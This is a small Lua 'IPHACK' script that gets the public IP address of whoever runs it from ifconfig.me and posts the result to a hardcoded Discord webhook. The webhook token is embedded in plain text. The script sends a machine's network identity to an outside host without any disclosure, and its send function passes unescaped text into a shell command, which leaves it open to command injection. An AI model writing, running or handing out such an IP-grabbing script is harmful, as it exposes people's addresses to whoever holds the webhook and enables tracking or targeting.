#!/bin/env lua

local token = "https://discord.com/api/webhooks/1549581017231265792/vXUqWMixqjjuDZZxEk8cWS238yXwQTJ6ZdCxAYz7NRgMGsGx-q4ULGuiWELzwV7cx0vX"
local header = "> # [IPHACK]: \n > "
local localheader = "\27[96m[proccess]: \27[0m"
local infoheader = "\27[96m[process]: \27[92m"
local resetheader = "\27[0m"
local errorheader = "\27[91m[ERROR]:\27[0m "

function send(url, content)
    os.execute(
    string.format("curl -X POST \"%s\" -H \"Content-Type: application/json\" -d '{\"content\":\"%s\"}'", url, content)
    )
end

function main(args)
    print(infoheader.."setting data..."..resetheader)
    if token == nil or token == "" then
        print(errorheader.."no token. insert token here:")
        io.write(" > ")
        token = io.read()
        print(infoheader.."setted."..resetheader)
    end
    
    print(localheader.."preparing conection...")
    send(token, header.."starting hacking proccess...")
    
    print(infoheader.."getting IP (opening pipeline)...")
    local pip = io.popen("curl -sv ifconfig.me")
    if pip then
        print(infoheader.."reading..."..resetheader)
        local response = pip:read("*a")
        pip:close()
        
        print(localheader.."response:\n"..response)
        print(infoheader.."sending..."..resetheader)
        send(token, header.."response: \n"..response)
        print(infoheader.."sent."..resetheader)
    else
        print(errorheader.."cannot open pipe")
        return 1
    end
    return 0
end

os.exit(main({...}))